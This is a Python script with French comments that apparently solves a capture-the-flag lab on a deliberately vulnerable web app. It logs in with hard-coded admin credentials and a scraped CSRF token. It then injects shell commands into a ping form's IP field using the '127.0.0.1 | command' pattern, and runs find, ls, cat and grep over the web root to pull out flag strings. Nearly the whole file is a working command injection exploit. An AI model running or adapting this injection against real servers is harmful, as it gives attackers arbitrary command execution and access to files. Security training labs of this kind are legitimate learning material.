#!/usr/bin/env python3
"""
Script pour trouver le flag dans le fichier index.php en utilisant l'injection de commandes

"""

# === IMPORTS ===
import requests  
import time     
import re        
from bs4 import BeautifulSoup  

# === CONFIGURATION ===
BASE_URL = "http://10.0.1.10:5780/website"  
LOGIN_URL = f"{BASE_URL}/login.php"  
COMMAND_INJECTION_URL = f"{BASE_URL}/vulnerabilities/exec/"  
USERNAME = "admin"  
PASSWORD = "canyouletmein"  


"""⚠️ Mêmes limitations que le script command_injection.py pour un vrai cas"""


def get_csrf_token(session, url):
    try:
        response = session.get(url, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'})
            if token_input and token_input.get('value'):
                return token_input.get('value')
            else:
                raise ValueError("Token CSRF non trouvé dans la page")
        else:
            raise RuntimeError(f"Erreur lors de la requête: code {response.status_code}")
    except requests.exceptions.RequestException as e:
        raise RuntimeError(f"Erreur de connexion au serveur: {str(e)}")



def login(session):
    print("🔐 Connexion au site DVWS...")
    
    csrf_token = get_csrf_token(session, LOGIN_URL)
    if not csrf_token:
        print("❌ Impossible de récupérer le token CSRF de login")
        return False

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': LOGIN_URL
    }
    
    data = {
        'username': USERNAME,        # admin
        'password': PASSWORD,        # canyouletmein
        'user_token': csrf_token,   # Token CSRF (OBLIGATOIRE!)
        'Login': 'Login'            # Bouton de soumission
    }
    
    try:
        response = session.post(LOGIN_URL, data=data, headers=headers, timeout=10)
        
        if response.status_code == 200:
            if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
                print("✅ Connexion réussie !")
                return True
            else:
                print("❌ Échec de la connexion")
                return False
        else:
            print(f"❌ Erreur HTTP lors de la connexion: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"❌ Erreur de connexion: {str(e)}")
        return False

def execute_command(session, command):
    print(f"🎯 Exécution: {command}")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': COMMAND_INJECTION_URL
    }
    
    injected_command = f"127.0.0.1 | {command}"
    
    data = {
        'ip': injected_command,  # Champ IP avec notre injection
        'Submit': 'Submit'       # Bouton de soumission
    }
    
    try:
        response = session.post(COMMAND_INJECTION_URL, data=data, headers=headers, timeout=10)
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Chercher la sortie de la commande
            output_area = soup.find('div', class_='vulnerable_code_area')
            if output_area:
                output_text = output_area.get_text().strip()
                print(f"📄 Résultat de la commande:")
                print("-" * 50)
                print(output_text)
                print("-" * 50)
                return output_text
            else:
                # Chercher dans d'autres endroits
                all_text_elements = soup.find_all(['div', 'p', 'span', 'td', 'pre'])
                for element in all_text_elements:
                    text = element.get_text().strip()
                    if text and len(text) > 10 and (command in text or 'PING' in text):
                        print(f"📄 Résultat de la commande:")
                        print("-" * 50)
                        print(text)
                        print("-" * 50)
                        return text
                
                print("❌ Aucun résultat trouvé")
                return None
        else:
            print(f"❌ Erreur HTTP: {response.status_code}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"❌ Erreur lors de l'exécution: {str(e)}")
        return None

def main():
    """
    Fonction principale pour trouver le flag dans index.php.
    """
    print("🚀 Recherche du flag dans index.php")
    
    session = requests.Session()
    
    if not login(session):
        print("❌ Impossible de se connecter. Arrêt du script.")
        return
    
    print("=" * 60)
    print("🔍 Recherche du flag dans index.php")
    
    # === Commandes pour localiser et examiner index.php ===
    # STRATÉGIE DE RECHERCHE :
    # 1. Localiser tous les fichiers index.php sur le serveur
    # 2. Examiner le contenu du répertoire web principal
    # 3. Lire le contenu du fichier index.php
    # 4. Chercher des mots-clés liés aux flags
    # 5. Utiliser des expressions régulières pour détecter des formats de flags
    commands = [
        "find /var/www -name 'index.php' -type f",  # Localiser tous les index.php
        "ls -la /var/www/DVWS/website/",  # Lister le contenu du répertoire web
        "cat /var/www/DVWS/website/index.php",  # Lire le contenu d'index.php
        "grep -i 'flag' /var/www/DVWS/website/index.php",  # Chercher "flag" dans index.php
        "grep -i 'ctf' /var/www/DVWS/website/index.php",  # Chercher "ctf" dans index.php
        "grep -E 'FLAG\{.*\}' /var/www/DVWS/website/index.php",  # Chercher format FLAG{...}
        "grep -E 'flag\{.*\}' /var/www/DVWS/website/index.php",  # Chercher format flag{...}
        "grep -E '[A-Za-z0-9_]{10,}' /var/www/DVWS/website/index.php",  # Chercher des chaînes longues
    ]
    
    results = {}
    
    for i, command in enumerate(commands, 1):
        print(f"\n[{i}/{len(commands)}] Exécution: {command}")
        print("-" * 40)
        
        result = execute_command(session, command)
        results[command] = result
        
        if result:
            print(f"📄 Résultat:")
            print(result)
            
            # === DÉTECTION DE PATTERNS DE FLAGS ===
            # On utilise des expressions régulières pour détecter différents formats de flags
            # Les patterns courants dans les CTF sont :
            # - FLAG{...} ou flag{...}
            # - CTF{...} ou ctf{...}
            # - Des chaînes longues qui pourraient être des flags
            flag_patterns = [
                r'FLAG\{[^}]+\}',        # Format FLAG{contenu}
                r'flag\{[^}]+\}',        # Format flag{contenu}
                r'CTF\{[^}]+\}',         # Format CTF{contenu}
                r'ctf\{[^}]+\}',         # Format ctf{contenu}
                r'[A-Za-z0-9_]{20,}',   # Chaînes longues qui pourraient être des flags
            ]
            
            # Chercher chaque pattern dans le résultat
            for pattern in flag_patterns:
                matches = re.findall(pattern, result, re.IGNORECASE)
                if matches:
                    print(f"🎯 FLAG TROUVÉ avec pattern {pattern}: {matches}")
        
        time.sleep(1)  # Délai entre les commandes pour éviter la surcharge
    
    # === ÉTAPE 5 : Analyser tous les résultats pour trouver des flags ===
    print("=" * 60)
    print("📊 Résumé de la recherche")
    
    all_flags = []
    
    # Parcourir tous les résultats pour extraire les flags
    for command, result in results.items():
        if result:
            # Chercher tous les patterns de flag dans chaque résultat
            flag_patterns = [
                r'FLAG\{[^}]+\}',
                r'flag\{[^}]+\}',
                r'CTF\{[^}]+\}',
                r'ctf\{[^}]+\}',
                r'[A-Za-z0-9_]{20,}',
            ]
            
            for pattern in flag_patterns:
                matches = re.findall(pattern, result, re.IGNORECASE)
                all_flags.extend(matches)
    
    if all_flags:
        print(f"🎯 FLAGS TROUVÉS:")
        for flag in set(all_flags):  # Supprimer les doublons avec set()
            print(f"  ✅ {flag}")
    else:
        print("❌ Aucun flag trouvé dans index.php")
        print("🔍 Vérifiez les résultats ci-dessus pour plus de détails")

if __name__ == "__main__":
    main()
